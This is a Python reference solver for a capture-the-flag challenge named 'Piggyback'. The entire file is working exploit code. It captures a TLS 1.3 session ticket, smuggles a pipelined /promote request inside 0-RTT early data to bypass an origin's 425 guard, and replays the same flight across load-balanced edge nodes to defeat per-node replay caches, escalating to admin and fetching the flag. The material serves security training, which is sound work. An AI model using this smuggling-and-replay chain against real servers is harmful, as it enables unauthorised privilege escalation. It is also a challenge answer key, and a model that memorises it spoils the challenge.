#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.12"
# dependencies = []
# ///
"""
Reference solver for the Piggyback challenge.

The chain:
  1. Smuggle a second request into a TLS 1.3 0-RTT early-data flight. The edge
     tags only the first request, so the pipelined /promote reaches the origin
     untagged and slips past its 425 guard.
  2. Replay the identical flight across the two edge nodes (the LB round-robins),
     so each node's local replay cache only ever sees it once. Two accepts =
     step 1 then step 2 = admin.
  3. Read /flag with the same token.

Python's standard `ssl` module exposes no 0-RTT API, so we drive a real 0-RTT
client -- `openssl s_client -early_data` (OpenSSL 3+, not LibreSSL) -- as a subprocess, and read its output
with a non-blocking loop (no `-quiet`: it implies `-ign_eof` and deadlocks).
"""
import argparse
import os
import random
import re
import select
import subprocess
import sys
import tempfile
import time

FLAG_RE = re.compile(rb"ccsCTF\{[^}]*\}")


def openssl(host, port, sni, extra, send=None, window=3.0, idle=0.6):
    """Run one s_client connection; return whatever it printed to stdout."""
    cmd = ["openssl", "s_client", "-connect", f"{host}:{port}",
           "-servername", sni, "-tls1_3", *extra]
    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.DEVNULL)
    try:
        if send is not None:
            try:
                p.stdin.write(send)
                p.stdin.flush()
            except BrokenPipeError:
                pass
        # Keep stdin open while we read, so the client doesn't tear the
        # connection down before the server has relayed its response.
        fd = p.stdout.fileno()
        os.set_blocking(fd, False)
        buf = bytearray()
        start = last = time.time()
        while time.time() - start < window:
            r, _, _ = select.select([fd], [], [], 0.1)
            if r:
                try:
                    chunk = os.read(fd, 65536)
                except BlockingIOError:
                    chunk = b""
                if chunk:
                    buf += chunk
                    last = time.time()
                elif p.poll() is not None:
                    break
            if buf and time.time() - last > idle:
                break
        return bytes(buf)
    finally:
        try:
            p.stdin.close()
        except Exception:
            pass
        p.terminate()
        try:
            p.wait(timeout=2)
        except Exception:
            p.kill()


def main():
    ap = argparse.ArgumentParser(description="Piggyback solver")
    ap.add_argument("host", nargs="?", default="127.0.0.1")
    ap.add_argument("port", nargs="?", default=443, type=int)
    ap.add_argument("--sni", default="piggyback")
    ap.add_argument("--tries", default=10, type=int,
                    help="max flight replays before giving up")
    args = ap.parse_args()

    token = f"solver-{os.getpid()}-{random.randint(1000, 9999)}"
    work = tempfile.mkdtemp(prefix="piggyback-")
    sess = os.path.join(work, "sess.pem")
    flight_path = os.path.join(work, "flight.bin")

    # Pipelined early-data flight: benign /warm (gets tagged Early-Data:1) +
    # smuggled /promote (forwarded untagged -> bypasses the 425 guard).
    flight = (
        f"GET /warm HTTP/1.1\r\nHost: {args.sni}\r\n\r\n"
        f"GET /promote HTTP/1.1\r\nHost: {args.sni}\r\nX-Token: {token}\r\n\r\n"
    ).encode()
    with open(flight_path, "wb") as f:
        f.write(flight)

    print(f"[*] target={args.host}:{args.port} token={token}")

    print("[*] step 0: full handshake -> capture a 0-RTT-capable ticket")
    req = f"GET / HTTP/1.1\r\nHost: {args.sni}\r\n\r\n".encode()
    for _ in range(3):
        openssl(args.host, args.port, args.sni, ["-sess_out", sess], send=req, window=3.0)
        if os.path.exists(sess) and os.path.getsize(sess) > 0:
            break
    else:
        print("[!] no session ticket captured")
        return 1

    print("[*] step 1+2: replay the same 0-RTT flight until admin is granted")
    got_admin = False
    for i in range(1, args.tries + 1):
        out = openssl(args.host, args.port, args.sni,
                      ["-sess_in", sess, "-early_data", flight_path])
        text = out.decode("latin-1")
        notes = [ln.strip() for ln in text.splitlines()
                 if "promote" in ln or "replay" in ln]
        print(f"    [flight {i}] " + ("; ".join(notes) if notes else "<no promote response>"))
        if "admin-granted" in text:
            got_admin = True
            break
    if not got_admin:
        print("[!] never reached step=2 / admin")
        return 1

    print("[*] step 3: fetch the flag on a normal connection")
    req = f"GET /flag HTTP/1.1\r\nHost: {args.sni}\r\nX-Token: {token}\r\n\r\n".encode()
    out = openssl(args.host, args.port, args.sni, [], send=req)
    m = FLAG_RE.search(out)
    if m:
        print(f"[+] FLAG: {m.group(0).decode()}")
        return 0
    print("[!] admin reached but flag not returned")
    return 1


if __name__ == "__main__":
    sys.exit(main())
